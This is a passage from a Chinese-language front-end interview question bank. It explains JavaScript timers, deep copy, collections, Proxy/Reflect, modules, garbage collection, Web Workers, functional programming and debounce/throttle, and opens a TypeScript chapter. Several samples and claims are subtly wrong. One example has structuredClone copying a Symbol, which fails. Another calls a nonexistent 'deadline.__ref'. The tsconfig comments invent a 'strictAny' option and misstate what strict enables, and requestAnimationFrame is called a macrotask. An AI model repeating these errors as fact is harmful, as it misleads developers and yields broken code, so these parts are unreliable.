// 这样可以批量处理多个DOM变化，避免每次变化都触发回调

// 例子：
const observer = new MutationObserver(mutations => {
  console.log(mutations.length);
});
observer.observe(document.body, { childList: true });

// DOM变化产生微任务，回调在同步代码完成后执行
document.body.appendChild(document.createElement('div'));
document.body.appendChild(document.createElement('span'));
// 如果是宏任务，会有延迟；作为微任务，立即响应

// requestAnimationFrame：在渲染前（每帧）执行，属于宏任务
// requestIdleCallback：在浏览器空闲时执行，属于宏任务
// 可以使用MessageChannel创建宏任务：
const channel = new MessageChannel();
channel.port1.postMessage(null); // 产生宏任务
```

---

### 15. 定时器与调度

#### 15.1 setTimeout 为什么不准

```javascript
// setTimeout(callback, 0) 不保证立即执行
// 因为事件循环中要等当前任务和微任务队列清空
// 再加上渲染（如果需要），才有空执行宏任务

setTimeout(() => console.log('timeout'), 0);
console.log('sync');
// 输出：sync, timeout（即使delay=0也要等同步代码完成）

// setTimeout实现机制：
// 浏览器：主线程执行 → 等微任务清空 → 渲染 → 执行宏任务
// setTimeout只是把回调注册到宏任务队列，并不是精确延时

// 原因1：事件循环非空闲时，要等待
// 原因2：渲染优先级：微任务 → 渲染 → setTimeout
// 原因3：后台页面（浏览器tab不可见）会降低精度（Chrome最低1s）

// 精确延迟实现（不完美但比setTimeout好）：
// Web Worker中没有UI渲染，可以更精确
// 或者使用 MessageChannel + performance.now() 测量

// setInterval问题：
// 如果回调执行时间超过delay，下一个回调会跳过（不排队）
const start = Date.now();
setInterval(() => {
  // 模拟耗时操作（超过1000ms）
  const now = Date.now();
  console.log(`上次执行：${now - start}ms ago`);
}, 1000);
// 实际间隔大于1000ms（会累积延迟）
```

#### 15.2 requestAnimationFrame 原理

```javascript
// requestAnimationFrame：在下次屏幕刷新前调用
// 每秒约60次（约16.67ms），与屏幕刷新率同步

// 与setTimeout(..., 16.7) 的区别：
// setTimeout：不管浏览器是否在渲染，到时间就执行
// rAF：一定在渲染前，浏览器统一调度，避免掉帧

// rAF使用场景：
// 1. 动画（CSS动画用transform/opacity，无需rAF）
// 2. 游戏循环
// 3. 滚动相关计算（用rAF同步到渲染）

// rAF调用时机（在事件循环中）：
// 每次event loop，浏览器检查是否有rAF回调
// 有的话，在渲染（paint）之前执行（按注册的顺序）
// 然后渲染，更新屏幕

// 节流动画的rAF写法：
let pending = false;
function onScroll() {
  if (pending) return;
  pending = true;
  requestAnimationFrame(() => {
    // 执行滚动处理逻辑
    handleScroll();
    pending = false;
  });
}
```

#### 15.3 requestIdleCallback 原理

```javascript
// requestIdleCallback：在浏览器空闲时执行低优先级任务
// 不影响用户交互/渲染

// 兼容性差，可用 polyfill：
window.requestIdleCallback = window.requestIdleCallback || function(cb) {
  const start = Date.now();
  return setTimeout(() => {
    cb({
      didTimeout: false,
      timeRemaining: () => Math.max(0, 50 - (Date.now() - start))
    });
  }, 1);
};

// 使用示例：
requestIdleCallback((deadline) => {
  // deadline.timeRemaining() 返回剩余空闲时间（毫秒）
  // deadline.didTimeout 是否超时
  while (deadline.timeRemaining() > 0 && tasks.length > 0) {
    const task = tasks.shift();
    task();
  }
  if (tasks.length > 0) {
    requestIdleCallback(deadline.__ref);
  }
});

// React fiber就用这个调度任务（虽然后来自己实现了scheduler）
```

---

### 16. 深拷贝与浅拷贝

```javascript
// 浅拷贝：只拷贝一层，引用类型共享
const a = { obj: { x: 1 } };
const b = Object.assign({}, a);
b.obj.x = 2;
console.log(a.obj.x); // 2（共享！）

// 深拷贝：递归拷贝所有层级
const c = { obj: { x: 1 } };
const d = JSON.parse(JSON.stringify(c));
d.obj.x = 2;
console.log(c.obj.x); // 1（独立）

// JSON深拷贝缺点：
// 1. 不能拷贝函数、undefined、Symbol
// 2. 不能拷贝循环引用（报错）
// 3. 不能拷贝 Date（变成字符串）、RegExp（变成空对象）、Error（丢失）
// 4. BigInt报错
// 5. 对象属性顺序可能改变（特别是稀疏数组）
const bad = {
  date: new Date(),
  regex: /test/,
  err: new Error("错误"),
  fn: function() {},
  big: BigInt(123),
  sym: Symbol("desc"),
  undefinedProp: undefined,
  nested: { fn: () => {} }
};
JSON.parse(JSON.stringify(bad));
// 结果：{date:"2024-01-01T...", regex:{}, err:{}, nested:{}}
// 函数、undefined、BigInt、Symbol全丢失！

// structuredClone（浏览器原生深拷贝，Node 17+）：
// 支持：循环引用、BigInt、Date、RegExp、Error、TypedArray等
const original = { date: new Date(), sym: Symbol("test"), big: 123n };
const cloned = structuredClone(original);
cloned.big === 123n; // true
original.date instanceof Date; // true（克隆后仍是Date）

// 手写深拷贝（完整版）：
function deepClone(target, map = new WeakMap()) {
  // 处理原始类型
  if (target === null || typeof target !== 'object') return target;

  // 处理循环引用
  if (map.has(target)) return map.get(target);

  // 处理Date
  if (target instanceof Date) return new Date(target);

  // 处理RegExp
  if (target instanceof RegExp) return new RegExp(target.source, target.flags);

  // 处理Error
  if (target instanceof Error) {
    const err = new Error(target.message);
    err.name = target.name;
    err.stack = target.stack;
    return err;
  }

  // 处理函数（普通函数和箭头函数分开）
  if (typeof target === 'function') {
    // 箭头函数没有自己的this，直接返回
    if (!target.prototype) return target;
    // 普通函数返回一个包装函数
    return function(...args) { return target.apply(this, args); };
  }

  // 处理Map
  if (target instanceof Map) {
    const cloneMap = new Map();
    map.set(target, cloneMap);
    target.forEach((v, k) => cloneMap.set(deepClone(k, map), deepClone(v, map)));
    return cloneMap;
  }

  // 处理Set
  if (target instanceof Set) {
    const cloneSet = new Set();
    map.set(target, cloneSet);
    target.forEach(v => cloneSet.add(deepClone(v, map)));
    return cloneSet;
  }

  // 处理Array和Object
  const clone = Array.isArray(target) ? [] : {};
  map.set(target, clone);
  for (const key of Reflect.ownKeys(target)) {
    clone[key] = deepClone(target[key], map);
  }
  return clone;
}
```

---

### 17. Map / Set / WeakMap / WeakSet

```javascript
// Map vs Object：
// ┌────────────────┬─────────────────────────┬─────────────────────────┐
// │ 特性            │ Map                      │ Object                   │
// ├────────────────┼─────────────────────────┼─────────────────────────┤
// │ 键类型          │ 任意（函数、对象、NaN都行）│ 只能是string/symbol      │
// │ 有序性          │ 按插入顺序                │ 基本有序（但插值顺序不确定） │
// │ 大小            │ size属性                  │ Object.keys().length     │
// │ 迭代           │ 可直接迭代                │ 需要Object.keys()       │
// │ 性能            │ 插入/删除 O(1)           │ 插入/删除 O(1)（同）    │
// │ 原型链          │ 无（可选Map设置）         │ 有（需hasOwnProperty）  │
// │ JSON           │ 不能直接                  │ 可以（需手动处理）       │
// └────────────────┴─────────────────────────┴─────────────────────────┘

const map = new Map();
map.set({}, 1);  // 对象作为键，===比较，{} !== {}
map.set(NaN, 2);
console.log(map.get(NaN)); // 2
console.log(map.size); // 2

// Set vs Array：
// ┌────────────────┬────────────────────────────────┐
// │ 特性           │ Set                             │
// ├────────────────┼────────────────────────────────┤
// │ 唯一性          │ 自动去重                        │
// │ 查找性能        │ O(1)（has）                    │
// │ 添加/删除       │ O(1)                           │
// │ 天然适合去重    │ [...new Set([1,2,2,3])]       │
// └────────────────┴────────────────────────────────┘

// WeakMap vs Map（关键区别：弱引用）：
// WeakMap：键只能是对象，值可以是任意类型
// 当键对象（弱引用）没有被其他引用时，可以被GC回收

// WeakMap应用场景：
// 1. 私有属性（不阻止对象被GC）
class Person {
  #data = new WeakMap();
  constructor(name) { this.#data.set(this, { name }); }
  getName() { return this.#data.get(this).name; }
}
// 对象被回收后，WeakMap中的条目也消失

// 2. 缓存计算结果（缓存key为对象）
const cache = new WeakMap();
function process(obj) {
  if (cache.has(obj)) return cache.get(obj);
  const result = heavyComputation(obj);
  cache.set(obj, result);
  return result;
}

// 3. DOM节点关联数据（不阻止DOM被GC）
const domData = new WeakMap();
domData.set(document.body, { mark: "special" });

// WeakSet：只能存对象，存的值弱引用，不阻止GC
// 应用：标记对象（"已访问过"标记）
const visited = new WeakSet();
function dfs(node) {
  if (visited.has(node)) return;
  visited.add(node);
  // 访问node...
}
```

---

### 18. 迭代器与生成器

#### 18.1 for...in vs for...of

```javascript
// for...in：遍历键（可枚举属性，包括原型链）
// for...of：遍历值（需要迭代器）

const arr = [10, 20, 30];
arr.custom = "hi"; // 数组也有自定义属性

for (let i in arr) { console.log(i); }  // 0,1,2,custom（索引+自定义属性）
for (let v of arr) { console.log(v); }  // 10,20,30（值）

// for...of原理：调用[Symbol.iterator]()
const iterator = arr[Symbol.iterator]();
console.log(iterator.next()); // {value:10, done:false}
console.log(iterator.next()); // {value:20, done:false}
console.log(iterator.next()); // {value:30, done:false}
console.log(iterator.next()); // {value:undefined, done:true}

// 可迭代对象（Iterable）：实现了Symbol.iterator
// 内置：Array, String, NodeList, Map, Set, TypedArray, arguments, DOM DOMTokenList
// 普通Object默认不可迭代，但可用for...in

// 给Object添加迭代器（使其可for...of）：
const obj = { a: 1, b: 2, c: 3 };
obj[Symbol.iterator] = function* () {
  for (const key of Object.keys(this)) {
    yield [key, this[key]];
  }
};
for (const [k, v] of obj) { console.log(k, v); }

// for...of可以用break/continue/return/throw
// 生成器实现迭代器：
function* createRange(start, end) {
  for (let i = start; i <= end; i++) {
    yield i;
  }
}
for (const n of createRange(1, 5)) { console.log(n); } // 1,2,3,4,5

// yield*：委托另一个迭代器
function* gen1() { yield 1; yield 2; }
function* gen2() { yield* gen1(); yield 3; }
// 等价于：yield 1; yield 2; yield 3;
```

---

### 19. Proxy 与 Reflect

#### 19.1 Proxy 原理

```javascript
// Proxy：拦截对象操作（get, set, deleteProperty, has, apply...）
// Proxy(target, handler)

const target = { name: "张三", age: 18 };
const handler = {
  get(target, prop, receiver) {
    console.log(`读取${prop}`);
    return Reflect.get(target, prop, receiver);
  },
  set(target, prop, value, receiver) {
    console.log(`设置${prop}=${value}`);
    return Reflect.set(target, prop, value, receiver);
  },
  deleteProperty(target, prop) {
    console.log(`删除${prop}`);
    return delete target[prop];
  },
  has(target, prop) {
    console.log(`检查${prop}`);
    return prop in target;
  }
};

const proxy = new Proxy(target, handler);
proxy.name;       // 触发get，输出"读取name"
proxy.age = 20;   // 触发set，输出"设置age=20"
delete proxy.name; // 触发deleteProperty
console.log("name" in proxy); // 触发has

// Proxy支持的拦截操作：
// get, set, deleteProperty, has, apply, construct,
// getPrototypeOf, setPrototypeOf, isExtensible,
// preventExtensions, getOwnPropertyDescriptor,
// defineProperty, ownKeys, enumerate（已废弃）

// 应用：响应式系统（Vue3）
// Vue3用Proxy实现数据响应式（取代了Vue2的Object.defineProperty）
function reactive(obj) {
  return new Proxy(obj, {
    get(target, key) {
      track(target, key); // 收集依赖
      return typeof target[key] === 'object'
        ? reactive(target[key]) // 深层响应式
        : target[key];
    },
    set(target, key, value) {
      target[key] = value;
      trigger(target, key); // 触发更新
      return true;
    }
  });
}
```

#### 19.2 Proxy vs defineProperty

```javascript
// Object.defineProperty：只能监听特定属性，Vue2用这个
// Proxy：拦截所有操作，Vue3用这个

// defineProperty缺点：
// 1. 无法监听新增属性（需要Vue.set）
const obj = {};
Object.defineProperty(obj, 'name', {
  get() { return this._name; },
  set(v) { this._name = v; }
});
obj.name = '张三'; // OK
obj.age = 18;      // 不触发（需要重新defineProperty）

// Proxy优点：
// 1. 监听所有属性（包括新增）
// 2. 监听数组变化（push, pop等操作）
// 3. 支持 Map/Set/WeakMap/WeakSet
// 4. 可以监听delete和in操作
// 5. 支持函数调用拦截（apply）

// Proxy缺点：
// 1. 浏览器兼容性（IE不支持）
// 2. 不能polyfill
// 3. 无法监视对象原型（getPrototypeOf另算）
```

#### 19.3 Reflect 作用

```javascript
// Reflect：Object操作的方法集合（替代Object上的老方法）
// ES6新增，和Proxy配套使用

// Proxy handler中调用默认行为
const target = { name: "张三" };
const proxy = new Proxy(target, {
  get(target, prop) {
    // 自定义行为 + Reflect获取默认行为
    const value = Reflect.get(target, prop);
    console.log(`拦截${prop}=${value}`);
    return value;
  }
});

// Reflect vs Object 对比：
// Object.defineProperty → Reflect.defineProperty
// Object.getPrototypeOf → Reflect.getPrototypeOf
// Object.setPrototypeOf → Reflect.setPrototypeOf
// Object.isExtensible → Reflect.isExtensible
// Object.preventExtensions → Reflect.preventExtensions
// Object.getOwnPropertyDescriptor → Reflect.getOwnPropertyDescriptor

// 为什么需要Reflect？
// 1. 更语义化（操作行为对应一个单独的对象）
// 2. Proxy handler中的默认行为
// 3. 更好用：Reflect.apply(fn, thisArg, args) 而非 fn.apply()
// 4. 返回值更一致（失败返回false而非抛错）

// Reflect.apply 替代老写法：
// 老：Function.prototype.apply.call(fn, thisArg, args)
// 好：Reflect.apply(fn, thisArg, args)

// Reflect配合Proxy实现"可撤销代理"：
const { proxy, revoke } = Proxy.revocable(target, handler);
// revoke()后，所有代理访问都报错（TypeError）
```

---

### 20. ESModule vs CommonJS

#### 20.1 核心区别

```javascript
// CommonJS（Node.js）：
// module.exports = { }
// exports.xxx =
// require()

// ESModule（浏览器/Node ESM）：
// export default / export
// import

// ┌─────────────────┬──────────────────┬──────────────────┐
// │ 特性             │ ESM              │ CJS              │
// ├─────────────────┼──────────────────┼──────────────────┤
// │ 编译时加载        │ 静态分析          │ 运行时解析        │
// │ import          │ 必须顶层          │ require可动态     │
// │ 导出值           │ 绑定（只读）       │ 值拷贝           │
// │ 循环引用         │ 靠暂时性死区      │ 靠缓存           │
// │ this            │ undefined        │ 当前模块对象      │
// │ 严格模式         │ 自动开启          │ 不自动           │
// │ 异步加载         │ 支持（import()）  │ 不支持           │
// │ 浏览器环境        │ 需要type=module   │ 不支持           │
// └─────────────────┴──────────────────┴──────────────────┘

// ESM的import为什么必须顶层（静态性）：
// 1. 可以在编译时确定导出依赖关系（静态分析）
// 2. 打包工具（如rollup/webpack）可以实现tree shaking
// 3. 可以在不执行模块的情况下分析依赖关系
// 4. 可以实现循环引用的提前检测

// 循环引用例子：
// a.js:
// import { b } from './b.js';
// export const a = 'a';
// b(); // 这里b可能还未定义！

// b.js:
// import { a } from './a.js';
// export const b = () => console.log(a);

// Node处理：a.js执行到import时暂停，先执行b.js，b.js执行完后a.js继续
// 结果：a = 'a'，b() 打印 'a'

// ESM的import绑定是只读的：
// lib.js:
// export let count = 0;
// export function inc() { count++; }

// main.js:
// import { count, inc } from './lib.js';
// count = 5; // TypeError：绑定是const-like，只读
// inc(); // 可以，因为lib.js内可以修改自己的变量
```

#### 20.2 Tree Shaking 原理

```javascript
// Tree Shaking：消除未使用的导出代码（dead code elimination）
// 前提：ESM + 静态分析 + 打包工具（rollup/webpack/esbuild）

// 原理：
// 1. 打包时静态分析所有import/export关系
// 2. 标记哪些导出被使用，哪些未被使用
// 3. 删除未使用的代码

// 条件：
// 1. 必须是ESM（CJS无法静态分析，rollup可以解析但效果差）
// 2. 导出函数必须是"纯函数"（无副作用）
// 3. 不能有动态import（无法静态分析）

// sideEffects：
// package.json中的sideEffects用于告诉打包工具哪些文件有副作用
{
  "sideEffects": [
    "./src/polyfill.js",
    "*.css"
  ]
}
// sideEffects: false → 所有导出都可安全删除
// sideEffects: ["file"] → 只有这些文件有副作用，其他可shaking

// 被tree shaking的代码（即使import了也不会被打包）：
import { unused } from 'lodash'; // 如果lodash没用到的功能，整行可删

// 副作用示例（有副作用，不能shaking）：
// 全局变量修改
window.globalVar = 1;
// 读写this
function init() { this._internal = true; }
// 模块执行时有额外行为
import './init-side-effect.js'; // 这行不能删
```

#### 20.3 动态 import 与 top-level await

```javascript
// 动态import：返回Promise，用于代码分割
import('./module.js')
  .then(m => m.exportFunc())
  .catch(err => console.error(err));

// 等价写法：
const m = await import('./module.js');

// 应用：按需加载
button.addEventListener('click', async () => {
  const { showModal } = await import('./modal.js');
  showModal();
});

// top-level await：模块顶层可直接使用await（ES2022）
// 相当于模块内自动包了async函数
const data = await fetch('/api/user').then(r => r.json());
export { data };

// top-level await限制：
// 1. 顶级可用，子函数内不可用（除非在async函数内）
// 2. 阻塞模块执行（可以用于模块初始化）
// 3. 可用在ESM的任意位置

// 模块循环引用处理：
// lib.mjs:
export { helper } from './helper.mjs'; // re-export，不执行helper.mjs全部代码
import { value } from './main.mjs';    // main.mjs如果正在执行，value可能是undefined
export const libValue = value || 'default';
```

---

### 21. 垃圾回收（GC）

```javascript
// V8 GC架构：
// ┌──────────────────────────────────────────┐
// │  新生代（New Space）│  老生代（Old Space）  │
// │  1-8MB            │  几十MB~GB            │
// │  Scavenge算法     │  Mark-Sweep + Mark-Compact │
// │  存活短的对象       │  存活长的对象          │
// │  复制-替换         │  标记-清除-整理       │
// └──────────────────────────────────────────┘

// 新生代：分成from space和to space
// 1. From space存对象
// 2. 触发GC时，检查存活对象，复制到To space
// 3. To space和From space互换
// 优点：速度快（牺牲50%空间换速度）
// 缺点：内存浪费，不适合大对象（大对象直接进老生代）

// 老生代：Mark-Sweep-Compact
// 1. Mark：从根节点（全局变量、栈变量）开始标记可达对象
// 2. Sweep：回收未标记的内存（留下碎片）
// 3. Compact：整理存活对象到一端，减少碎片

// 引用计数（其他引擎使用）：
// 每个对象记录被引用次数，为0时立即回收
// 优点：及时回收
// 缺点：循环引用无法回收
var a = { prop: null };
var b = { prop: null };
a.prop = b; // b引用+1
b.prop = a; // a引用+1
// a和b互相引用，但外部没有引用，所以应该回收
// 引用计数看不到这个"外部引用"，所以无法回收！

// V8用标记-清除解决这个问题：即使互相引用，只要从根不可达，就回收

// 内存泄漏场景：
// 1. 全局变量（意外创建）
// function leak() { bigData = new Array(1000000); } // window.bigData

// 2. 定时器未清除
// setInterval(() => { /* 引用了obj */ }, 1000);
// clearInterval(id);

// 3. 闭包（持有大对象引用）
// function outer() {
//   const large = new Array(1000000);
//   return function() { return large.length; };
// }

// 4. DOM引用（DOM被移除但JS还引用着）
// const els = { body: document.body };
// els.body.remove();
// // document.body还在els中，DOM树无法GC

// 5. 事件监听未移除
// el.addEventListener('click', handler);
// el.removeEventListener('click', handler);

// 手动触发GC（调试用）：
// % gc() // 在Node启动时加--expose-gc，或浏览器debug时用
```

---

### 22. JS 单线程与 Web Worker

```javascript
// 为什么JS是单线程？
// 历史原因：DOM是单线程的，JS和DOM共享同一线程
// 设计决定：避免多线程访问DOM的同步问题（锁、死锁）
// 示例：如果多线程同时修改同一DOM，结果不可预测

// Web Worker：
// 独立的JS线程，无法操作DOM，可以做耗时计算

// 创建Worker：
const worker = new Worker('worker.js');
worker.postMessage({ type: 'calc', data: [1, 2, 3] });
worker.onmessage = (e) => console.log('结果:', e.data);

// worker.js:
// self.onmessage = (e) => {
//   const result = heavyComputation(e.data.data);
//   self.postMessage(result);
// };

// Worker的限制：
// 1. 不能操作DOM
// 2. 不能直接访问parent（通过postMessage通信）
// 3. 不能访问某些全局对象（window, document）
// 4. 内存不共享（通过消息传递）

// SharedArrayBuffer：跨线程共享内存（需要配合Atomics）
// 用途：高性能计算，如大数据处理
// 注意：需要Cross-Origin-Embedder-Policy头，否则浏览器禁用

// worker.js:
const sharedBuffer = new SharedArrayBuffer(100);
const view = new Int32Array(sharedBuffer);

// 主线程 + Worker 共享同一个buffer，可同时读写
// Atomics.add(view, 0, 1); // 原子操作，避免竞争

// Atomics：原子操作
// Atomics.load(arr, index)
// Atomics.store(arr, index, value)
// Atomics.add, Atomics.sub, Atomics.and, Atomics.or
// Atomics.wait / Atomics.notify（条件变量）
// Atomics.compareExchange(arr, index, expected, newValue)

// Worker通信方式：
// 1. postMessage（克隆，结构化克隆算法）
// 2. Transferable对象（转移所有权，如ArrayBuffer）
// 3. SharedArrayBuffer（共享内存）

// 可转移 vs 克隆：
buffer = new ArrayBuffer(8);
worker.postMessage(buffer, [buffer]); // buffer在主线程变为0长度，转移到Worker
// 克隆：不改变原对象，Worker有副本
// 转移：原对象被"掏空"，Worker获得所有权
```

---

### 23. 函数式编程

#### 23.1 概念

```javascript
// 纯函数：给定相同输入，总是返回相同输出，无副作用
// 副作用：修改外部状态（修改参数、I/O、网络请求、DOM操作、console）

// 副作用示例：
let total = 0;
function add(n) { total += n; return total; } // 修改外部变量， impure
function addPure(n) { return total + n; }    // 不修改外部，pure
// 建议：纯函数更容易测试和推理

// Immutable：永远不修改原数据
const arr = [1, 2, 3];
const newArr = [...arr, 4]; // 不修改arr，返回新数组
// Immutable.js：结构共享的持久数据结构
import { List, Map } from 'immutable';
const list = List([1, 2, 3]);
const newList = list.push(4); // 原list不变，newList是新引用
// 原理：只记录变化路径，不复制整个结构（结构共享）
```

#### 23.2 柯里化

```javascript
// 柯里化：把多参数函数转为一系列单参数函数
function add(a, b, c) { return a + b + c; }
function currying(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...args2) {
      return curried.apply(this, args.concat(args2));
    };
  };
}
const curriedAdd = currying(add);
console.log(curriedAdd(1)(2)(3));   // 6
console.log(curriedAdd(1, 2)(3));   // 6
console.log(curriedAdd(1, 2, 3));   // 6

// 实际应用：参数复用 + 延迟执行
const log = currying((level, message) => console.log(`[${level}] ${message}`));
const infoLog = log('INFO');
infoLog('系统启动');   // [INFO] 系统启动
infoLog('用户登录');   // [INFO] 用户登录
```

#### 23.3 高阶函数与 compose

```javascript
// 高阶函数：接受函数或返回函数的函数
// 常见：map, filter, reduce, forEach, sort, some, every, find

// compose：组合多个函数，从右到左执行
// f(g(h(x))) = compose(f, g, h)(x)
function compose(...fns) {
  if (fns.length === 0) return x => x;
  if (fns.length === 1) return fns[0];
  return fns.reduceRight((f, g) => (...args) => f(g(...args)));
}

// pipe：compose的变种，从左到右执行
function pipe(...fns) {
  if (fns.length === 0) return x => x;
  if (fns.length === 1) return fns[0];
  return fns.reduce((f, g) => (...args) => g(f(...args)));
}

// 示例：数据处理管道
const processUser = pipe(
  validateInput,           // 1. 验证输入
  normalizeData,           // 2. 规范化数据
  removeDuplicates,       // 3. 去重
  enrichWithMeta,          // 4. 补充元信息
  formatOutput             // 5. 格式化输出
);

// trace：调试compose中间结果
const trace = label => x => { console.log(`${label}:`, x); return x; };
const debug = pipe(
  trace('输入'),
  double,
  trace('翻倍后'),
  addOne,
  trace('加一后')
);

// reduce实现map：
const myMap = (fn, arr) => arr.reduce((acc, x) => [...acc, fn(x)], []);
// filter基于reduce：
const myFilter = (pred, arr) => arr.reduce((acc, x) => pred(x) ? [...acc, x] : acc, []);
```

#### 23.4 RxJS 简介

```javascript
// RxJS：响应式编程库，基于Observable + 操作符
// 核心：把异步事件流当成值来处理

// 常用创建操作符：
import { of, from, interval, fromEvent } from 'rxjs';

// Observable：可观察对象（生产者）
// Observer：观察者（消费者）
// Subscription：订阅关系

// 操作符：
// map, filter, debounceTime, switchMap, mergeMap, take, takeUntil, distinctUntilChanged, scan, reduce

// 示例：搜索防抖
fromEvent(searchInput, 'input').pipe(
  debounceTime(300),
  map(e => e.target.value),
  distinctUntilChanged(),
  switchMap(query => ajax(`/search?q=${query}`)) // 取消之前的请求
).subscribe(results => render(results));

// 为什么switchMap能取消前一个？
// switchMap内部会unsubscribe前一个Observable，再subscribe新的
// 实现：每次新值来时，调用innerObservable.subscribe()
// 管理innerSubscription，如果新值来就unsubscribe旧的
```

---

### 24. 防抖与节流

```javascript
// 防抖（debounce）：事件触发n秒后才执行，n秒内再次触发则重新计时
function debounce(fn, delay, immediate = false) {
  let timer;
  return function(...args) {
    const context = this;
    // 立即执行模式
    if (immediate && !timer) fn.apply(context, args);
    clearTimeout(timer);
    timer = setTimeout(() => {
      if (!immediate) fn.apply(context, args);
      timer = null;
    }, delay);
  };
}

// 场景：搜索框输入（等待用户停止输入后才搜索）、窗口调整大小（调整完成后执行一次）

// 节流（throttle）：n秒内只执行一次（固定频率）
function throttle(fn, delay) {
  let lastTime = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastTime >= delay) {
      fn.apply(this, args);
      lastTime = now;
    }
  };
}

// 场景：滚动事件（滚动时每隔一段时间处理）、按钮防重复点击、拖拽

// requestAnimationFrame节流（更精确）：
function throttleRAF(fn) {
  let pending = false;
  return function(...args) {
    if (!pending) {
      pending = true;
      requestAnimationFrame(() => {
        fn.apply(this, args);
        pending = false;
      });
    }
  };
}

// leading + trailing 组合：
function throttleFull(fn, delay, options = {}) {
  let timer, lastArgs;
  const { leading = true, trailing = true } = options;
  return function(...args) {
    if (!timer && leading) fn.apply(this, args);
    lastArgs = args;
    clearTimeout(timer);
    timer = setTimeout(() => {
      if (trailing && lastArgs) fn.apply(this, lastArgs);
      timer = null;
    }, delay);
  };
}

// 应用区别：
// 应用区别：
// 搜索框输入：debounce（停笔后才搜）
// 滚动加载：throttle（滚动时持续加载）
// 窗口resize：debounce（停止调整后才处理）

## 四、TypeScript 超大题库

> TypeScript 是 JavaScript 的超集，为大型项目提供类型安全。本章覆盖 TypeScript 核心概念与高频面试题。

---

### 1. TypeScript 基础

#### 1.1 为什么出现 TS vs JS

```typescript
// JavaScript 问题：
// 1. 运行时不检查类型，错误到运行时才暴露
// 2. 没有类型提示，IDE 支持差
// 3. 重构困难，改一个函数签名不知道哪里用到
// 4. 团队协作时代码可读性差

// TypeScript 解决：
// 1. 编译时类型检查，编译期发现错误
// 2. 类型注解提供 IDE 智能提示
// 3. 接口、泛型、枚举等工程化能力
// 4. 代码即文档，可读性强

// TS 是 JS 的超集：
// TS代码 → TypeScript编译器 → JS代码
// 编译后删除了类型注解，输出纯 JS

// 示例：
// JS运行时才发现问题：
function add(a, b) { return a + b; }
add("1", 2); // "12"（字符串拼接，逻辑错误）

// TS编译时就报错：
function addTS(a: number, b: number): number { return a + b; }
addTS("1", 2); // 编译错误：Argument of type 'string' is not assignable to parameter of type 'number'
```

#### 1.2 TS 编译流程

```
TypeScript 编译流程：

┌──────────────────────────────────────────────────────┐
│  .ts / .tsx 文件                                      │
│                                                      │
│  ┌─────────────────┐                                │
│  │  解析（Parse）   │  → AST（抽象语法树）            │
│  └────────┬────────┘                                │
│           ▼                                          │
│  ┌─────────────────┐                                │
│  │  类型检查        │  → 类型错误报告                 │
│  │  (Type Check)   │                                │
│  └────────┬────────┘                                │
│           ▼                                          │
│  ┌─────────────────┐                                │
│  │  发射（Emit）     │  → .js 文件 + .d.ts 类型声明   │
│  │  (Transpile)     │                                │
│  └─────────────────┘                                │
│                                                      │
│  编译选项（tsconfig.json）决定行为                    │
└──────────────────────────────────────────────────────┘

// tsc --noEmit：只做类型检查，不输出文件
// tsc --emitDeclarationOnly：只生成 .d.ts
// tsc --incremental：增量编译（只编译变更的文件）
```

#### 1.3 tsconfig.json 常见配置

```json
{
  "compilerOptions": {
    "target": "ES2020",           // 编译到哪个JS版本
    "module": "ESNext",           // 模块系统
    "lib": ["ES2020", "DOM"],     // 内置类型库
    "jsx": "react-jsx",           // JSX处理方式

    "strict": true,               // 严格模式（开启所有严格检查）
    // 等价于开启以下全部：
    // strictNullChecks, strictAny, noImplicitThis,
    // alwaysStrict, noUnusedLocals, noUnusedParameters,
    // noImplicitReturns, noFallthroughCasesInSwitch

    "strictNullChecks": true,     // null/undefined严格检查
    "noImplicitAny": true,        // 不允许隐式any

    "moduleResolution": "bundler", // 模块解析策略（Node16/node_modules）
    "baseUrl": ".",                // 基础路径
    "paths": { "@/*": ["src/*"] }, // 路径别名

    "outDir": "./dist",           // 输出目录
    "rootDir": "./src",           // 源码目录

    "declaration": true,          // 生成.d.ts声明文件
    "declarationMap": true,       // 生成.d.ts.map，方便调试

    "skipLibCheck": true,         // 跳过库文件类型检查（大幅提速）
    "incremental": true,          // 增量编译
    "tsBuildInfoFile": ".tsbuildinfo", // 增量缓存文件

    "esModuleInterop": true,     // 让 default import 兼容 CommonJS
    "allowSyntheticDefaultImports": true, // 允许从无 default export 的模块默认导入

    "sourceMap": true,            // 生成 .map 源码映射

    "forceConsistentCasingInFileNames": true, // 文件名大小写一致
    "noUnusedLocals": true,       // 未使用的局部变量报错
    "noUnusedParameters": true   // 未使用的参数报错
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist"]
}
```

#### 1.4 skipLibCheck

```typescript
// skipLibCheck: true 时，TS 只检查你写的代码的类型
// 跳过 node_modules/@types/**/*.d.ts 的类型检查

// 为什么需要它？
// 1. 大幅提升编译速度（许多第三方库类型定义有问题）
// 2. 避免第三方库类型定义不兼容的问题
// 3. 适合快速开发，不必等库的类型定义修复

// skipLibCheck: false 时的问题：
// 库A的 .d.ts 依赖库B的某类型，但版本不匹配
// → TS报错：类型不兼容
// → 你需要改库的 .d.ts（无法修改node_modules）
// → 非常麻烦

// 实际建议：
// "skipLibCheck": true（大多数项目）
// 严格追求100%类型安全的库项目可设为 false
```

---

### 2. 类型基础

#### 2.1 any / unknown / never

```typescript
// any：任意类型，关闭类型检查（尽量避免）
function process(data: any) {
  console.log(data.trim()); // 不报错，运行时可能崩
}

// unknown：安全版的 any
// 使用前必须缩小类型（type narrowing），否则TS报错
function processUnknown(data: unknown) {
  // console.log(data.trim()); // 报错：Object is of type 'unknown'
  if (typeof data === 'string') {
    console.log(data.trim()); // OK，TS知道是string
  }
}

// never：永不存在的值（用于永不返回的函数、死代码）
function throwError(msg: string): never {
  throw new Error(msg);
}

// never用于类型穷举（exhaustive check）：
type Shape = Circle | Square | Triangle;
function area(s: Shape): number {
  switch (s.kind) {
    case 'circle': return Math.PI * s.radius ** 2;
    case 'square': return s.side ** 2;
    case 'triangle': return 0.5 * s.base * s.height;
    default:
      // 如果漏掉一个case，shape类型变成never，编译报错
      const _exhaustive: never = s;
      throw new Error(`Unknown shape: ${_exhaustive}`);
  }
}

// any vs unknown：
// any.xxx 都合法，unknown.xxx 必须先缩小类型
// unknown 比 any 更安全，是"有约束的any"

// never的应用：条件类型
type IsString<T> = T extends string ? true : false;
type A = IsString<"hello">; // true
type B = IsString<123>;    // false

// 总结：
// ┌────────────┬─────────────────┬────────────────────┐
// │ 类型        │ 可赋值给         │ 可访问属性           │
